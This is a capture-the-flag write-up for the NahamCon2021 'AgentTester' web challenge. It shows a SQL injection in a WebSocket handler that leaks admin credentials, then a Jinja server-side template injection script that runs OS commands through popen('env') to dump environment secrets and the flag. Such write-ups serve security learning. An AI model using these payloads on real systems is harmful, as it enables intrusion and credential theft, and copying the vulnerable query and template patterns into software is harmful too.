---
title: "NahamCon2021 CTF - AgentTester"
date: 2021-03-15T11:26:45+02:00
categories:
- writeup
- ctf
- nahamcon
- nahamcon2021
- 2021
---

## category

web - medium

## solution

We're given an archive to download, `agenttester.zip`. This contained a Dockerfile and a python web application. The files in the archive had many secrets redacted which were set using environment variables. One specifically interesting one was `CHALLENGE_FLAG`, which we could assume was the target value to leak.

The challenge URL dropped us on a page where we need to login. So, create an account, login and land on the home page of the agent tester.

{{< figure src="/images/nahamcon/agent_tester.png" >}}

In burp we'll see that WebSocket requests are being made when we submit an "agent".

{{< figure src="/images/nahamcon/agent_tester_ws.png" >}}

From both playing with the application and the Python source code, we could spot an SQL injection vulnerability.

{{< figure src="/images/nahamcon/agent_tester_sql.png" >}}

```python
query = db.session.execute(
    "SELECT userAgent, url FROM uAgents WHERE userAgent = '%s'" % uAgent
).fetchone()
```

The application also set the admin credentials from environment variables when configuring the web application. Using the SQL injection we found we could try and leak those.

```python
@app.before_first_request
def create_tables():
    db.create_all()

    try:
        user = User(
            username=os.environ.get("ADMIN_BOT_USER"),
            email="admin@admin.com",
            password=os.environ.get("ADMIN_BOT_PASSWORD"),
            about="",
        )
        db.session.add(user)
        db.session.commit()
    except Exception as e:
        print(str(e), flush=True)
```

Thankfully Burp allows for repeating web socket requests, so crafting a payload to disclose the admin user's password is relatively easy. 

{{< figure src="/images/nahamcon/agent_tester_admin_creds.png" >}}

With admin creds, we can now browse to the `/debug` endpoint which was protected by the admin session (session id `1`).

```python
@app.route("/debug", methods=["POST"])
def debug():
    sessionID = session.get("id", None)
    if sessionID == 1:
        code = request.form.get("code", "<h1>Safe Debug</h1>")
        return render_template_string(code)
    else:
        return "Not allowed."
```

The vuln should be relatively obvious here. Jinja's `render_template_string()` is called if we provide a value to `code`. To exploit this template injection I wrote this script.

```python
import requests
import sys

burp0_url = "http://challenge.nahamcon.com:31162/debug"
burp0_cookies = {"auth": "eyJpZCI6MX0.YE44rQ.41KZbUtORmkul0Va5ku_yh-ywn0"}
burp0_headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Referer": "http://challenge.nahamcon.com:31329/",
        "Upgrade-Insecure-Requests": "1"
}

data = {"code": f"{{{{ {sys.argv[1]} }}}}"}

r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=data)
print(r.text)
```

Calling it to run the `env` OS command revealed the flag.

```bash
$ python3 pwn.py "config.__class__.__init__.__globals__['os'].popen('env').read()" | grep CHALLENGE
CHALLENGE_FLAG=flag{fb4a87cfa85cf8c5ab2effedb4ea7006}
CHALLENGE_NAME=AgentTester
```
